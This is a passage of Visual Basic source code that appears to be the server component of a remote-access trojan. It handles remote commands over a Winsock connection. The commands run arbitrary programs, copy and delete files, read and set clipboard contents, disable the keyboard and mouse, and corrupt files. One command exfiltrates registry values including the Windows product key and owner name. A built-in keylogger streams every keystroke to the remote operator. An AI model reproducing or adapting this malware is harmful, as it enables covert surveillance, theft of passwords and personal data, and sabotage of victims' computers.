            RemoveDirectory Mid(SendData, 4, Len(SendData) - 3)
        Case "080":
            'MAKE DIRECTORY
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            MkDir Mid(SendData, 4, Len(SendData) - 3)
        Case "081":
            'COPY FILE TO NEW LOCATION
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            For M = 1 To Len(Mid(SendData, 4, Len(SendData) - 3))
                If Mid(Mid(SendData, 4, Len(SendData) - 3), M, 1) = Chr(0) Then
                    FileCopy Mid(SendData, 4, Len(SendData) - 4 - Len(Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M))), Right(SendData, Len(Mid(SendData, 4, Len(SendData) - 3)) - M)
                    Exit For
                End If
            Next M
        Case "082":
            'EMPTY CLIPBOARD
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            VB.Clipboard.Clear
        Case "083":
            'RUN PROGRAM
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            Shell Mid(SendData, 4, Len(SendData) - 3), vbNormalFocus
        Case "084":
            'SET TEXT TO CLIPBOARD
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            VB.Clipboard.SetText Mid(SendData, 4, Len(SendData) - 3)
        Case "085":
            'GET CLIPBOARD TEXT
            WinsockCtl.SendData "021" & VB.Clipboard.GetText
        Case "086":
            'SET CLIPBOARD PICTURE
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            VB.Clipboard.SetData Mid(SendData, 4, Len(SendData) - 3)
        Case "087":
            'GET CLIPBOARD PICTURE
            WinsockCtl.SendData "022" & VB.Clipboard.GetData
        Case "088":
            'DISCONNECT INTERNET
            If InternetAutodialHangup(0) Then
                WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            Else
                WinsockCtl.SendData "M4Your data (SET) information request has been aborted."
            End If
        Case "089":
            'PROMPT USER TO CONNECT TO THE NET
            If InternetAutodial(INTERNET_AUTODIAL_FORCE_ONLINE, 0) Then
                'WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            Else
                'WinsockCtl.SendData "M4Your data (SET) information request has been aborted."
            End If
        Case "090":
            'FORCE CONNECTION
            If InternetAutodial(INTERNET_AUTODIAL_FORCE_UNATTENDED, 0) Then
                'WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            Else
                'WinsockCtl.SendData "M4Your data (SET) information request has been aborted."
            End If
        Case "091":
            'SHOW DESKTOP SHORTCUT PROPERTIES IN SYSTEM TRAY
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            Shell "RunDLL deskcp16.dll,QUICKRES_RUNDLLENTRY", vbNormalFocus
        Case "092":
            'LOCK FILE (FILES ONLY WITH HEADERS)
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            FileNumber = FreeFile
            Close #FileNumber
            Open Mid(SendData, 4, Len(SendData) - 3) For Binary As #FileNumber
                FileBinary = Space(LOF(FileNumber))
                Get #FileNumber, 1, FileBinary
                Put #FileNumber, 1, "#"
                Put #FileNumber, 2, FileBinary
            Close #FileNumber
        Case "093":
            'SHELL CPL FILE (DON'T WORK MISSING ENTRY)
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            Shell "Rundll32.exe shell32.dll, Control_RunDll " & Mid(SendData, 4, Len(SendData) - 3)
        Case "094":
            'DISABLE THE KEYBOARD
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            Shell "rundll32 keyboard,disable"
        Case "095":
            'DISABLE THE MOUSE
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            Shell "rundll32 mouse,disable"
        Case "096":
            'SET MOUSE TRAIL TO
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            Mouse_SetTrails CLng(Mid(SendData, 4, Len(SendData) - 3))
        Case "097":
            'MONITOR SHUTDOWN
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SendMessage Me.hWnd, WM_SYSCOMMAND, SC_MONITORPOWER, ByVal 0&
        Case "098":
            'MONITOR ONLINE
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SendMessage Me.hWnd, WM_SYSCOMMAND, SC_MONITORPOWER, ByVal -1&
        Case "099":
            'SWAP MOUSE BUTTONS
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SwapMouseButton 1
        Case "100":
            'RESTORE MOUSE BUTTONS
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SwapMouseButton 0
        Case "101":
            'CHANGE WALLPAPER
            WinsockCtl.SendData "M2Your data (SET) information request has been sent."
            SetWallpaper Mid(SendData, 4, Len(SendData) - 3)
        Case "102":
            'START THE KEY LOGGER
            WinsockCtl.SendData "M2Your data (SET) information request has been sent. You should start recieving data soon."
            Call CheckKey
            EndKeylogger = False
            KeyloggerTimer.Enabled = True
        Case "103":
            'END THE KEYLOGGER
            WinsockCtl.SendData "M2Your data (SET) information request has been sent. Key logger has been disabled."
            EndKeylogger = True
            KeyloggerTimer.Enabled = False
        Case "104":
            RegVal0(0) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "ProductId")
            RegVal0(1) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "ProductKey")
            RegVal0(2) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "ProductName")
            RegVal0(3) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "ProgramFilesDir")
            RegVal0(4) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "RegisteredOrganization")
            RegVal0(5) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "RegisteredOwner")
            RegVal0(6) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "SystemRoot")
            RegVal0(7) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "Version")
            RegVal0(8) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "VersionNumber")
            RegVal0(9) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "DevicePath")
            RegVal0(10) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "ConfigPath")
            RegVal0(11) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "CommonFilesDir")
            RegVal0(12) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "MediaPath")
            RegVal0(13) = GetStringValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION", "OtherDevicePath")
            WinsockCtl.SendData "023" & RegVal0(0) & Chr(0) & RegVal0(1) & Chr(0) & RegVal0(2) & Chr(0) & RegVal0(3) & Chr(0) & RegVal0(4) & Chr(0) & RegVal0(5) & Chr(0) & RegVal0(6) & Chr(0) & RegVal0(7) & Chr(0) & RegVal0(8) & Chr(0) & RegVal0(9) & Chr(0) & RegVal0(10) & Chr(0) & RegVal0(11) & Chr(0) & RegVal0(12) & Chr(0) & RegVal0(13)
    End Select
    
    Exit Sub
    
FinaliseError:
    On Error Resume Next
    
    WaitTime = 0
    Do Until WaitTime = 10
        WaitTime = WaitTime + 1
        DoEvents
    Loop
    
    WinsockCtl.SendData "M4Could not complete task sent to the server as their was problems."
End Sub

Private Sub KeyloggerTimer_Timer()
    If EndKeylogger = True Then KeyloggerTimer.Enabled = False: Exit Sub
    Dim Retval As Boolean
    Retval = CheckExplorer 'Check if explorer is running
    If Retval = False Then End 'if not, then it means that user has exited windows
                            'generally get and "end task" error
                            'if still running
                            'this will exit when explorer is not running
End Sub

Private Sub CheckKey()
    Dim Keycode As Integer, X As Integer, Shift As Integer
    Dim Control As Integer, Temp As String
    
    On Error GoTo FinaliseError
    
    Do
    DoEvents
    If EndKeylogger = True Then KeyloggerTimer.Enabled = False: Exit Sub
    If WinsockCtl.State <> 7 Then KeyloggerTimer.Enabled = False: EndKeylogger = True: Exit Sub
        For Keycode = 8 To 255 'scan every key from #8-255
            X = GetAsyncKeyState(Keycode) 'get the state of the key
            If EndKeylogger = True Then KeyloggerTimer.Enabled = False: Exit Sub
            If WinsockCtl.State <> 7 Then KeyloggerTimer.Enabled = False: EndKeylogger = True: Exit Sub
            If X = -32767 Then 'if the key is pressed, its value is -32767
                Select Case Keycode
                    Case 8 'backspace
                        WinsockCtl.SendData "00B"
                    Case 9 'tab
                        'WinsockCtl.SendData "NL0"
                        WinsockCtl.SendData Chr(0) & "[TAB]" & vbNewLine
                        'WinsockCtl.SendData "NL0"
                    Case 13 'enter
                        'WinsockCtl.SendData "NL0"
                        WinsockCtl.SendData Chr(0) & "[ENTER]" & vbNewLine
                        'WinsockCtl.SendData "NL0"
                    Case 27 'escape
                        'WinsockCtl.SendData "NL0"
                        WinsockCtl.SendData Chr(0) & "[ESC]" & vbNewLine
                        'WinsockCtl.SendData "NL0"
                    Case 32 'space
                        WinsockCtl.SendData Chr(0) & " "
                    Case 48 '0
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, ")", "0")
                    Case 49 '1
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "!", "1")
                    Case 50 '2
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "@", "2")
                    Case 51 '3
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "#", "3")
                    Case 52 '4
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "$", "4")
                    Case 53 '5
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "%", "5")
                    Case 54 '6
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "^", "6")
                    Case 55 '7
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "&", "7")
                    Case 56 '8
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "*", "8")
                    Case 57 '9
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "(", "9")
                    Case 65 To 90 'a-z
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, UCase$(Chr$(Keycode)), LCase$(Chr$(Keycode)))
                    Case 112 To 123 'F1-F12
                        'WinsockCtl.SendData "NL0"
                    WinsockCtl.SendData "[FKEY]" & "[F" + CStr(Keycode - 111) + "]" & vbNewLine   'Case F1 to F12
                        'WinsockCtl.SendData "NL0"
                        Temp = Ctrl(Control = 1, "On", "Off")
                    Case 186 ';
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, ":", ";")
                    Case 187 '=
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "+", "=")
                    Case 188 ',
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "<", ",")
                    Case 189 '-
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "_", "-")
                    Case 190 '.
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, ">", ".")
                    Case 191 '/
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "?", "/")
                    Case 192 '`
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "~", "`")
                    Case 219 '[
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "{", "[")
                    Case 220 '\
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "|", "\")
                    Case 221 ']
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, "}", "]")
                    Case 222 ''
                        WinsockCtl.SendData Chr(0) & Shf(Shift = 1, Chr$(34), "'")
                End Select
            End If
            If EndKeylogger = True Then KeyloggerTimer.Enabled = False: Exit Sub
            If WinsockCtl.State <> 7 Then KeyloggerTimer.Enabled = False: EndKeylogger = True: Exit Sub
        Next Keycode
    DoEvents
    If EndKeylogger = True Then KeyloggerTimer.Enabled = False: Exit Sub
    If WinsockCtl.State <> 7 Then KeyloggerTimer.Enabled = False: EndKeylogger = True: Exit Sub
    Loop
    
    Exit Sub
    
FinaliseError:
    
    If WinsockCtl.State = 7 Then
        WinsockCtl.SendData "M3Error, key logger has been stopped. Their was an error with the transfer."
        KeyloggerTimer.Enabled = False
        EndKeylogger = True
        Exit Sub
    Else
        KeyloggerTimer.Enabled = False
        EndKeylogger = True
        Exit Sub
    End If
    
End Sub

Public Function CheckExplorer() As Boolean

    Const PROCESS_ALL_ACCESS = 0
    Dim uProcess As PROCESSENTRY32
    Dim rProcessFound As Long
    Dim hSnapshot As Long
    Dim szExename As String
    Dim Found As Boolean
    Dim i As Integer
    On Local Error GoTo Finish

    Const TH32CS_SNAPPROCESS As Long = 2&

    uProcess.dwSize = Len(uProcess)
    hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    rProcessFound = ProcessFirst(hSnapshot, uProcess)

    Do While rProcessFound
        i = InStr(1, uProcess.szexeFile, Chr(0))
        szExename = LCase$(Left$(uProcess.szexeFile, i - 1))

        If UCase$(Right$(szExename, 12)) = "EXPLORER.EXE" Then
            Found = True
            Call CloseHandle(hSnapshot)
            GoTo Finish
        End If

        rProcessFound = ProcessNext(hSnapshot, uProcess)
    Loop


    Call CloseHandle(hSnapshot)
Finish:

If Found = False Then CheckExplorer = False
If Found = True Then CheckExplorer = True
End Function
